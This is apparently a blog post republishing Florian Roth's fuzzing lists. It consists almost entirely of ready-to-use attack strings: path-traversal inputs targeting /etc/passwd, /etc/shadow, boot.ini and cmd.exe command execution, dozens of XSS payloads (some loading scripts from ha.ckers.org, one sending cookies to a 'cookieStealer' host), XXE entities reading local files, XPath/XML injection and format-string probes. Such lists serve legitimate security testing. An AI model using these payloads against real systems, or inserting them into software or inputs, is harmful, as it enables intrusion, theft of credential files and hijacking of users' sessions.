    %5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
    %5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
    %5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
    %5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
    %5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
    %%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
    %%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
    %%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
    %%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39
    ..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
    ..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
    ..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
    ..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
    ..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
    ..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
    ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
    %2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
    %2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
    ../../../../../../../../../etc/passwd
    ../../../../../../../../etc/passwd
    ../../../../../../../etc/passwd
    ../../../../../../etc/passwd
    ../../../../../etc/passwd
    ../../../../etc/passwd
    ../../../etc/passwd
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    %2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34
    ../../../.htaccess
    ../../.htaccess
    ../.htaccess
    .htaccess
    ././.htaccess
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73
    %2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73
    %2e%2e%2f%2e%68%74%61%63%63%65%73%73
    %2e%68%74%61%63%63%65%73%73
    %2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
    %%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
    %%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
    %%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33
    ../../../../../../../../../../../../etc/hosts%00
    ../../../../../../../../../../../../etc/hosts
    ../../boot.ini
    /../../../../../../../../%2A
    ../../../../../../../../../../../../etc/passwd%00
    ../../../../../../../../../../../../etc/passwd
    ../../../../../../../../../../../../etc/shadow%00
    ../../../../../../../../../../../../etc/shadow
    /../../../../../../../../../../etc/passwd^^
    /../../../../../../../../../../etc/shadow^^
    /../../../../../../../../../../etc/passwd
    /../../../../../../../../../../etc/shadow
    /./././././././././././etc/passwd
    /./././././././././././etc/shadow
    \..\..\..\..\..\..\..\..\..\..\etc\passwd
    \..\..\..\..\..\..\..\..\..\..\etc\shadow
    ..\..\..\..\..\..\..\..\..\..\etc\passwd
    ..\..\..\..\..\..\..\..\..\..\etc\shadow
    /..\../..\../..\../..\../..\../..\../etc/passwd
    /..\../..\../..\../..\../..\../..\../etc/shadow
    .\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
    .\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
    \..\..\..\..\..\..\..\..\..\..\etc\passwd%00
    \..\..\..\..\..\..\..\..\..\..\etc\shadow%00
    ..\..\..\..\..\..\..\..\..\..\etc\passwd%00
    ..\..\..\..\..\..\..\..\..\..\etc\shadow%00
    %0a/bin/cat%20/etc/passwd
    %0a/bin/cat%20/etc/shadow
    %00/etc/passwd%00
    %00/etc/shadow%00
    %00../../../../../../etc/passwd
    %00../../../../../../etc/shadow
    /../../../../../../../../../../../etc/passwd%00.jpg
    /../../../../../../../../../../../etc/passwd%00.html
    /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
    /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
    /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
    /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
    %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
    /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
    %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%
    /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
    \\&apos;/bin/cat%20/etc/passwd\\&apos;
    \\&apos;/bin/cat%20/etc/shadow\\&apos;
    ../../../../../../../../conf/server.xml
    /../../../../../../../../bin/id
    |
    C:/inetpub/wwwroot/global.asa
    C:\inetpub\wwwroot\global.asa
    C:/boot.ini
    C:\boot.ini
    ../../../../../../../../../../../../localstart.asp%00
    ../../../../../../../../../../../../localstart.asp
    ../../../../../../../../../../../../boot.ini%00
    ../../../../../../../../../../../../boot.ini
    /./././././././././././boot.ini
    /../../../../../../../../../../../boot.ini%00
    /../../../../../../../../../../../boot.ini
    /..\../..\../..\../..\../..\../..\../boot.ini
    /.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
    \..\..\..\..\..\..\..\..\..\..\boot.ini
    ..\..\..\..\..\..\..\..\..\..\boot.ini%00
    ..\..\..\..\..\..\..\..\..\..\boot.ini
    /../../../../../../../../../../../boot.ini%00.html
    /../../../../../../../../../../../boot.ini%00.jpg
    /.../.../.../.../.../
    ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
    /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini

*Sorry for breaking the layout - but "breaking the layout" could become
"breaking the software".*

### XSS Discovery Statements

Discovery Statements

    # Discovery Statements (July 2007)
    # Statements used to cause exploitable errors
    # Florian Roth @4nc4p

    ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
    '';!--"<XSS>=&{()}

Common exploit code

    # Best Statements (July 2007)
    # Statements covering 90% of all vulnerabilities
    # Florian Roth @4nc4p

    '><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
    "><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
    \'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
    '); alert('xss'); var x='
    \\'); alert(\'xss\');var x=\'
    //--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));

Full List - (Update: 11 August 2009 - Total Statements: 162)

    # Full List (July 2007)
    # All Statements - Full List
    # Based on the XSS cheat sheet
    # http://ha.ckers.org/xss.html
    # Florian Roth @4nc4p

    <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
    "<IMG SRC=""javascript:alert('XSS');"">"
    <IMG SRC=JaVaScRiPt:alert('XSS')>
    "<IMG SRC=javascript:alert(""XSS"")>"
    "<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>"
    "<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"
    <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
    <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
    <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
    "<IMG SRC=""jav"
    "ascript:alert('XSS');"">"
    "perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out"
    "perl -e 'print ""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>"";' > out"
    "<IMG SRC="" &#14;  javascript:alert('XSS');"">"
    "<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
    "<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>"
    "<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
    "<<SCRIPT>alert(""XSS"");//<</SCRIPT>"
    <SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
    <SCRIPT SRC=//ha.ckers.org/.j>
    "<IMG SRC=""javascript:alert('XSS')"""
    <iframe src=http://ha.ckers.org/scriptlet.html <
    <SCRIPT>a=/XSS/\nalert(a.source)</SCRIPT>
    "\"";alert('XSS');//"
    "</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>"
    "<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">"
    "<BODY BACKGROUND=""javascript:alert('XSS')"">"
    <BODY ONLOAD=alert('XSS')>
    "<IMG DYNSRC=""javascript:alert('XSS')"">"
    "<IMG LOWSRC=""javascript:alert('XSS')"">"
    "<BGSOUND SRC=""javascript:alert('XSS');"">"
    "<BR SIZE=""&{alert('XSS')}"">"
    "<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>"
    "<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">"
    "<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">"
    <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
    "<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">"
    "<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>"
    "<XSS STYLE=""behavior: url(xss.htc);"">"
    "<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS"
    "<IMG SRC='vbscript:msgbox(""XSS"")'>"
    ¼script¾alert(¢XSS¢)¼/script¾
    "<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">"
    "<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">"
    "<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">"
    "<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"
    "<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>"
    "<TABLE BACKGROUND=""javascript:alert('XSS')"">"
    "<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">"
    "<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">"
    "<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">"
    "<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">"
    "<DIV STYLE=""width: expression(alert('XSS'));"">"
    "<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>"
    "<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">"
    "<XSS STYLE=""xss:expression(alert('XSS'))"">"
    "exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>"
    "<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>"
    "<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>"
    "<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>"
    <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
    "<BASE HREF=""javascript:alert('XSS');//"">"
    "<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>"
    <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
    "<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>"
    "<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>"
    "<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
    "<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
    "<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>"
    "<XML SRC=""xsstest.xml"" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
    "<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>alert(""XSS"")</SCRIPT>""></BODY></HTML>"
    "<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>"
    "<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->"
    "<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>"
    "<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">"
    "<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"
    "<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
    "<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
    "<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
    "<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
    "<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
    "<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
    "<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>"
    "<A HREF=""http://66.102.7.147/"">XSS</A>"
    "<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>"
    "<A HREF=""http://1113982867/"">XSS</A>"
    "<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>"
    "<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>"
    "<A HREF=""h\ntt\tp://6"
    "<A HREF=""//www.google.com/"">XSS</A>"
    "<A HREF=""//google"">XSS</A>"
    "<A HREF=""http://google.com/"">XSS</A>"
    "<A HREF=""http://www.google.com./"">XSS</A>"
    "<A HREF=""javascript:document.location='http://www.google.com/'"">XSS</A>"
    "<A HREF=""http://www.gohttp://www.google.com/ogle.com/"">XSS</A>"
    "<div onmouseover=""document.write(""XSS-XSS-XSS"");"">"
    "<img src=""javascript:document.write(""XSS-XSS-XSS"");"">"
    "<input type=""image"" dynsrc=""javascript:document.write(""XSS-XSS-XSS"");"">"
    "<bgsound src=""javascript:document.write(""XSS-XSS-XSS"");"">"
    "&{document.write(""XSS-XSS-XSS"");};"
    "<img src=&{document.write(""XSS-XSS-XSS"");};>"
    "<link rel=""stylesheet"" href=""javascript:document.write(""XSS-XSS-XSS"");"">"
    "<iframe src=""vbscript:document.write(""XSS-XSS-XSS"");"">"
    "<img src=""livescript:document.write(""XSS-XSS-XSS"");"">"
    "<a href=""about:<script>document.write(""XSS-XSS-XSS"");</script>"">"
    "<meta http-equiv=""refresh"" content=""0;url=javascript:document.write(""XSS-XSS-XSS"");"">"
    "<body onload=""document.write(""XSS-XSS-XSS"");"">"
    "<div style=""background-image: url(javascript:document.write(""XSS-XSS-XSS""););"">"
    "<div style=""behaviour: url([link to code]);"">"
    "<div style=""binding: url([link to code]);"">"
    "<div style=""width: expression(document.write(""XSS-XSS-XSS""););"">"
    "<style type=""text/javascript"">document.write(""XSS-XSS-XSS"");</style>"
    "<object classid=""clsid:..."" codebase=""javascript:document.write(""XSS-XSS-XSS"");"">"
    "<style><!--</style><script>document.write(""XSS-XSS-XSS"");//--></script>"
    "<![CDATA[<!--]]><script>document.write(""XSS-XSS-XSS"");//--></script>"
    "<<script>document.write(""XSS-XSS-XSS"");</script>"
    "<img src=""blah""onmouseover=""document.write(""XSS-XSS-XSS"");"">"
    "<img src=""blah>"" onmouseover=""document.write(""XSS-XSS-XSS"");"">"
    "<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>"
    "<a href=""javascript#document.write(""XSS-XSS-XSS"");"">"
    "<img dynsrc=""javascript:document.write(""XSS-XSS-XSS"");"">"
    "&<script>document.write(""XSS-XSS-XSS"");</script>"
    "<img src=""mocha:document.write(""XSS-XSS-XSS"");"">"
    "<div style=""binding: url([link to code]);""> [Mozilla]"
    "<!-- -- --><script>document.write(""XSS-XSS-XSS"");</script><!-- -- -->"
    "<xml src=""javascript:document.write(""XSS-XSS-XSS"");"">"
    "<xml id=""X""><a><b><script>document.write(""XSS-XSS-XSS"");</script>;</b></a></xml>"
    "[\xC0][\xBC]script>document.write(""XSS-XSS-XSS"");[\xC0][\xBC]/script>"
    ><script>
    "<script>alert(""WXSS"")</script>"
    "<<script>alert(""WXSS"");//<</script>"
    <script>alert(document.cookie)</script>
    '><script>alert(document.cookie)</script>
    '><script>alert(document.cookie);</script>
    "%3cscript%3ealert(""WXSS"");%3c/script%3e"
    %3cscript%3ealert(document.cookie);%3c%2fscript%3e
    %3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
    &ltscript&gtalert(document.cookie);</script>
    &ltscript&gtalert(document.cookie);&ltscript&gtalert
    <xss><script>alert('WXSS')</script></vulnerable>
    <IMG%20SRC='javascript:alert(document.cookie)'>
    "<IMG%20SRC=""javascript:alert('WXSS');"">"
    "<IMG%20SRC=""javascript:alert('WXSS')"""
    <IMG%20SRC=JaVaScRiPt:alert('WXSS')>
    <IMG%20SRC=javascript:alert("WXSS")>
    "<IMG%20SRC=`javascript:alert(""'WXSS'"")`>"
    "<IMG%20""""""><SCRIPT>alert(""WXSS"")</SCRIPT>"">"
    <IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
    <IMG%20SRC='javasc
    "<IMG%20SRC=""jav"
    "<IMG%20SRC=""jav    ascript:alert('WXSS');"">"
    "<IMG%20SRC=""jav
    ascript:alert('WXSS');"">"
    "<IMG%20SRC=""jav
    ascript:alert('WXSS');"">"
    "<IMG%20SRC=""%20&#14;%20javascript:alert('WXSS');"">"
    "<IMG%20DYNSRC=""javascript:alert('WXSS')"">"
    "<IMG%20LOWSRC=""javascript:alert('WXSS')"">"
    <IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
    <IMG%20SRC=javascript:alert('XSS')>
    <IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
    <IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
    '%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
    "><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
    %22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
    ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//\;alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
    '';!--<XSS>=&{()}"



### XML Attacks - (Update: 11 August 2009 - Total Statements: 15)

    Statements
    count(/child::node())
    x' or name()='username' or 'x'='y
    <name>','')); phpinfo(); exit;/*</name>
    <![CDATA[<script>var n=0;while(true){n++;}</script>]]>
    <![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
    "<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>"
    "<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>"
    "<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>"
    "<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>"
    "<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>"
    "<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>"
    "<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
    "<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
    "<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
    "<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"

### Format String Statements - (Update: 30 July 2007 - Total Statements: 28)

    # Full List
    # Format String tests to determine errors in variable handling
    # Florian Roth @4nc4p

    %s%p%x%d
    .1024d
    %.2049d
    %p%p%p%p
    %x%x%x%x
    %d%d%d%d
    %s%s%s%s
    %99999999999s
    %08x
    %%20d
    %%20n
    %%20x
    %%20s
    %s%s%s%s%s%s%s%s%s%s
    %p%p%p%p%p%p%p%p%p%p
    %#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
    f(x)=%s x 123
    f(x)=%x x 255
    %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
    %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
    XXXXX.%p
